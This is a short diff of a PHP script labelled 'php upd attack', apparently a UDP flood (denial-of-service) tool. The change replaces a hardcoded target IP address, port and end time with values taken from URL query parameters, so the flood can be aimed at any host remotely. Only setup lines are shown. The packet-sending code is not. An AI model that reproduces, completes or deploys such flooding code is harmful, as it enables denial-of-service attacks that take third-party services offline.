@@ -6,9 +6,9 @@
  * @Description: php upd attack
  */
 set_time_limit(999999);
-$host = $_GET['host'] = '118.244.153.233';
-$port = $_GET['port'] = 80;
-$exec_time = $_GET['time'] = 1438237995;
+$host = $_GET['host'];
+$port = $_GET['port'];
+$exec_time = $_GET['time'];
 $Sendlen = 35;
 // $Sendlen = 65535;
 $packets = 0;
